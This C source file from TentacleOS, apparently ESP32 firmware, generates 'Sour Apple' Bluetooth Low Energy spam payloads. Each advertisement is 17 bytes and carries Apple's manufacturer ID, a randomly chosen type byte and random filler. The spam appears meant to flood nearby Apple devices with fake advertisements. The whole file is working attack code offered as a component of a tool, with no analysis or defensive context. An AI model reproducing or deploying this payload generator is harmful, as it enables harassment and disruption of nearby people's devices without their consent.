// Copyright (c) 2025 HIGH CODE LLC
//
// TentacleOS is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// TentacleOS is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with TentacleOS. If not, see <https://www.gnu.org/licenses/>.

#include "sour_apple_spam.h"

#include "esp_random.h"

static const char *TAG = "SOUR_APPLE_SPAM";

#define SOUR_APPLE_PAYLOAD_SIZE 17
#define SOUR_APPLE_RANDOM_BYTES 3

static const uint8_t SOUR_APPLE_TYPES[] = {
    0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
#define SOUR_APPLE_TYPES_COUNT (sizeof(SOUR_APPLE_TYPES) / sizeof(SOUR_APPLE_TYPES[0]))

int generate_sour_apple_payload(uint8_t *buffer, size_t max_len) {
  if (buffer == NULL || max_len < SOUR_APPLE_PAYLOAD_SIZE)
    return 0;

  uint8_t i = 0;
  buffer[i++] = 16;   // Length
  buffer[i++] = 0xFF; // Type
  buffer[i++] = 0x4C; // Apple ID LSB
  buffer[i++] = 0x00; // Apple ID MSB
  buffer[i++] = 0x0F;
  buffer[i++] = 0x05;
  buffer[i++] = 0xC1;

  buffer[i++] = SOUR_APPLE_TYPES[esp_random() % SOUR_APPLE_TYPES_COUNT];

  esp_fill_random(&buffer[i], SOUR_APPLE_RANDOM_BYTES);
  i += SOUR_APPLE_RANDOM_BYTES;

  buffer[i++] = 0x00;
  buffer[i++] = 0x00;
  buffer[i++] = 0x10;

  esp_fill_random(&buffer[i], SOUR_APPLE_RANDOM_BYTES);
  i += SOUR_APPLE_RANDOM_BYTES;

  return i;
}
